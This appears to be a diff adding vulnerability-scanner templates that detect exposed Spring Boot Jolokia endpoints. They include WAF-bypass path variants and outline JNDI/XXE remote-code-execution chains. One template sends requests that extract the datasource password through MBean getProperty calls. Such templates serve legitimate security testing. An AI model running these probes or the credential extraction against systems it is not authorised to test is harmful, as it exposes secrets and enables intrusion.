@@ -1,0 +1,263 @@
+id: springboot-jolokia-rce-chain
+
+info:
+  name: Spring Boot Jolokia - RCE Chain Detection
+  author: Shafranpackeer
+  severity: critical
+  description: |
+    Detects exposed Jolokia endpoints that can be exploited for Remote Code Execution.
+    Jolokia exposes JMX beans over HTTP, allowing various exploitation chains:
+
+    1. reloadByURL - Load malicious logback config for JNDI/XXE RCE
+    2. createJNDIRealm - Tomcat JNDI injection for RCE
+    3. setLoggerLevel - Debug credential leaks
+    4. invoke - Direct MBean method invocation
+
+    CVE-2018-1000130: Jolokia < 1.3.7 proxy mode JNDI injection
+    CVE-2018-1000129: Jolokia < 1.5.0 reflected XSS via mimeType
+  reference:
+    - https://github.com/mpgn/Spring-Boot-Actuator-Exploit
+    - https://blog.certcube.com/spring-boot-pentesting-part-4-spring4shell/
+    - https://0xn3va.gitbook.io/cheat-sheets/framework/spring/spring-boot-actuators
+    - https://www.veracode.com/blog/research/exploiting-spring-boot-actuators
+  metadata:
+    max-request: 25
+    verified: true
+  tags: springboot,jolokia,rce,jndi,xxe,critical
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 10.0
+    cwe-id: CWE-94,CWE-611,CWE-502
+
+http:
+  - method: GET
+    path:
+      # ============================================
+      # JOLOKIA ENDPOINT DISCOVERY
+      # ============================================
+      - "{{BaseURL}}/actuator/jolokia"
+      - "{{BaseURL}}/jolokia"
+      - "{{BaseURL}}/actuator/jolokia/list"
+      - "{{BaseURL}}/jolokia/list"
+
+      # ============================================
+      # WAF BYPASS - URL ENCODING
+      # ============================================
+      - "{{BaseURL}}/%61ctuator/jolokia"
+      - "{{BaseURL}}/actuator/%6Aolokia"
+      - "{{BaseURL}}/actuator/j%6Flokia"
+      - "{{BaseURL}}/actuator/jolokia%23"
+      - "{{BaseURL}}/%61%63%74%75%61%74%6F%72/jolokia"
+
+      # ============================================
+      # SEMICOLON BYPASS
+      # ============================================
+      - "{{BaseURL}}/actuator;/jolokia"
+      - "{{BaseURL}}/;/actuator/jolokia"
+      - "{{BaseURL}}/jolokia;/list"
+
+      # ============================================
+      # ALTERNATE PATHS
+      # ============================================
+      - "{{BaseURL}}/manage/jolokia"
+      - "{{BaseURL}}/management/jolokia"
+      - "{{BaseURL}}/api/jolokia"
+
+    stop-at-first-match: true
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "jolokia"
+          - "agentId"
+          - "agentType"
+          - "value"
+        condition: or
+
+      - type: word
+        part: header
+        words:
+          - "application/json"
+          - "text/json"
+        condition: or
+
+      - type: status
+        status:
+          - 200
+
+---
+id: springboot-jolokia-reloadbyurl-check
+
+info:
+  name: Spring Boot Jolokia reloadByURL - RCE Vector
+  author: Shafranpackeer
+  severity: critical
+  description: |
+    Detects if Jolokia's reloadByURL MBean is available, which can be exploited
+    for Remote Code Execution via:
+    1. XXE - Load external XML with entity injection
+    2. JNDI - Load logback config with JNDI lookup
+    3. Groovy - Load groovy script via configuration
+
+    The reloadByURL function allows loading logging configuration from arbitrary URLs.
+  reference:
+    - https://github.com/mpgn/Spring-Boot-Actuator-Exploit
+    - https://www.veracode.com/blog/research/exploiting-spring-boot-actuators
+  metadata:
+    max-request: 4
+    verified: true
+  tags: springboot,jolokia,reloadbyurl,rce,xxe
+
+http:
+  - method: GET
+    path:
+      # Check for logback JMXConfigurator MBean
+      - "{{BaseURL}}/actuator/jolokia/list/ch.qos.logback.classic"
+      - "{{BaseURL}}/jolokia/list/ch.qos.logback.classic"
+      - "{{BaseURL}}/actuator/jolokia/search/ch.qos.logback.classic:*"
+      - "{{BaseURL}}/jolokia/search/ch.qos.logback.classic:*"
+
+    stop-at-first-match: true
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "JMXConfigurator"
+          - "reloadByURL"
+          - "ch.qos.logback.classic"
+        condition: or
+
+      - type: status
+        status:
+          - 200
+
+---
+id: springboot-jolokia-createjndirealm-check
+
+info:
+  name: Spring Boot Jolokia createJNDIRealm - JNDI Injection Vector
+  author: Shafranpackeer
+  severity: critical
+  description: |
+    Detects if Tomcat's createJNDIRealm MBean is available via Jolokia.
+    This MBean can be exploited for JNDI injection:
+    1. Create a JNDIRealm
+    2. Set connectionURL to attacker's RMI/LDAP server
+    3. Set contextFactory to RegistryContextFactory
+    4. Start the realm to trigger JNDI lookup → RCE
+  reference:
+    - https://0xn3va.gitbook.io/cheat-sheets/framework/spring/spring-boot-actuators
+    - https://github.com/JoyChou93/java-sec-code/wiki/Actuators-to-RCE
+  metadata:
+    max-request: 4
+    verified: true
+  tags: springboot,jolokia,jndi,rce,tomcat
+
+http:
+  - method: GET
+    path:
+      # Check for Tomcat MBeanFactory
+      - "{{BaseURL}}/actuator/jolokia/list/Catalina"
+      - "{{BaseURL}}/jolokia/list/Catalina"
+      - "{{BaseURL}}/actuator/jolokia/search/Catalina:*"
+      - "{{BaseURL}}/jolokia/search/Catalina:type=MBeanFactory"
+
+    stop-at-first-match: true
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "MBeanFactory"
+          - "createJNDIRealm"
+          - "Catalina"
+        condition: or
+
+      - type: status
+        status:
+          - 200
+
+---
+id: springboot-jolokia-property-extraction
+
+info:
+  name: Spring Boot Jolokia - Property Extraction via MBeans
+  author: Shafranpackeer
+  severity: high
+  description: |
+    Attempts to extract sensitive properties via Jolokia MBeans.
+    Even if /env endpoint masks secrets, Jolokia's getProperty operation
+    may return unmasked values.
+
+    Note: This template invokes MBean getProperty operations which are read-only
+    but may trigger application logging or monitoring alerts.
+  reference:
+    - https://0xn3va.gitbook.io/cheat-sheets/framework/spring/spring-boot-actuators
+  metadata:
+    max-request: 4
+    verified: true
+  tags: springboot,jolokia,secrets,extraction
+
+http:
+  - raw:
+      # Extract via SpringApplication MBean
+      - |
+        POST /actuator/jolokia HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {
+          "mbean": "org.springframework.boot:name=SpringApplication,type=Admin",
+          "operation": "getProperty",
+          "type": "EXEC",
+          "arguments": ["spring.datasource.password"]
+        }
+
+      - |
+        POST /jolokia HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {
+          "mbean": "org.springframework.boot:name=SpringApplication,type=Admin",
+          "operation": "getProperty",
+          "type": "EXEC",
+          "arguments": ["spring.datasource.password"]
+        }
+
+      # Extract via EnvironmentManager MBean (Spring Cloud)
+      - |
+        POST /actuator/jolokia HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {
+          "mbean": "org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager",
+          "operation": "getProperty",
+          "type": "EXEC",
+          "arguments": ["spring.datasource.password"]
+        }
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"value"'
+          - '"status"'
+        condition: and
+
+      - type: word
+        part: body
+        words:
+          - '"error"'
+        negative: true
+
+      - type: status
+        status:
+          - 200
